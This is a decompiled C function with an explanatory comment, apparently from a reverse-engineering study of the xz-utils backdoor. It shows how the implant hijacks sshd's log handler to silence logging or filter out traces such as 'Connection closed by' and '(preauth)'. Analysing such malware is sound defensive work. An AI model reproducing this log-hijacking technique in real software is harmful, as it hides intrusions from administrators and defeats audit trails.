// /home/kali/xzre-ghidra/xzregh/107DE0_sshd_configure_log_hook.c
// Function: sshd_configure_log_hook @ 0x107DE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_configure_log_hook(cmd_arguments_t * cmd_flags, global_context_t * ctx)


/*
 * AutoDoc: Validates that the caller provided writable log handler slots plus the format strings needed to rewrite messages, and
 * only honours logging requests when the controlling flag (bit 3 in `cmd_flags->flags1`) is set or the backdoor is already
 * running as root. If the existing handler/context pointers already reside inside sshd it swaps them so the implant can
 * hijack them safely, snapshots the original function/context, and either disables logging entirely or enables filtering
 * mode. In filter mode it verifies that the `%s`, `"Connection closed by"`, and `"(preauth)"` strings are available before
 * dropping `mm_log_handler_hook` into place.
 */

#include "xzre_types.h"

BOOL sshd_configure_log_hook(cmd_arguments_t *cmd_flags,global_context_t *ctx)

{
  byte flags1;
  sshd_log_ctx_t *log_ctx;
  void **ctx_slot;
  void *orig_ctx;
  void **selected_ctx_slot;
  log_handler_fn *handler_slot;
  byte logging_requested;
  
  log_ctx = ctx->sshd_log_ctx;
  if (((((cmd_flags == (cmd_arguments_t *)0x0) || (log_ctx == (sshd_log_ctx_t *)0x0)) ||
       (handler_slot = log_ctx->log_handler_slot, handler_slot == (log_handler_fn *)0x0)) ||
      ((ctx_slot = (log_handler_fn *)log_ctx->log_handler_ctx_slot, ctx_slot == (log_handler_fn *)0x0
       || (log_ctx->log_hook_entry == (mm_log_handler_fn)0x0)))) ||
     (log_ctx->handler_slots_valid == FALSE)) {
    return FALSE;
  }
  flags1 = cmd_flags->flags1;
  logging_requested = flags1 & 8;
  if ((logging_requested == 0) || (ctx->caller_uid == 0)) {
    orig_ctx = *ctx_slot;
    selected_ctx_slot = ctx_slot;
    if ((orig_ctx != (log_handler_fn)0x0) &&
       ((ctx->sshd_text_start <= orig_ctx && (orig_ctx < ctx->sshd_text_end)))) {
      log_ctx->log_handler_slot = ctx_slot;
      log_ctx->log_handler_ctx_slot = handler_slot;
      selected_ctx_slot = handler_slot;
      handler_slot = ctx_slot;
    }
    orig_ctx = *selected_ctx_slot;
    log_ctx->saved_log_handler = *handler_slot;
    log_ctx->saved_log_handler_ctx = orig_ctx;
    if (logging_requested == 0) {
      log_ctx->log_squelched = TRUE;
    }
    else if ((flags1 & 0x10) != 0) {
      if (log_ctx->fmt_percent_s == (char *)0x0) {
        return FALSE;
      }
      if (log_ctx->str_connection_closed_by == (char *)0x0) {
        return FALSE;
      }
      if (log_ctx->str_preauth == (char *)0x0) {
        return FALSE;
      }
    }
    *handler_slot = (log_handler_fn)log_ctx->log_hook_entry;
  }
  return TRUE;
}

